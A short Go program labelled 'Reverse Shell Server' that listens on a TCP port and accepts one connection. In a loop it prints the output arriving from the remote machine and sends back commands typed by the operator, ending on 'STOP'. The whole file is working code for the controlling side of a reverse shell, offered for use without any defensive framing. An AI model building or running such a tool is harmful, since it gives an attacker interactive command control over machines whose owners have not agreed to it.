/*
	Reverse Shell Server
	- Use: server <PORT>
*/
package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
)

func main() {
	arguments := os.Args
	if len(arguments) == 1 {
		fmt.Println("Please provide port number")
		return
	}

	PORT := ":" + arguments[1]
	l, err := net.Listen("tcp", PORT)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer l.Close()

	c, err := l.Accept()
	if err != nil {
		fmt.Println(err)
		return
	}

	for {
		data, err := bufio.NewReader(c).ReadString('¬')
		if err != nil {
			fmt.Println(err)
			return
		}
		data = string(strings.TrimRight(data, "¬"))
		if strings.TrimSpace(data) == "STOP" {
			fmt.Println("Exiting remote shell server!")
			return
		}

		fmt.Print(data + "\n> ")
		reader := bufio.NewReader(os.Stdin)
		text, _ := reader.ReadString('\n')
		c.Write([]byte(text))
	}
}
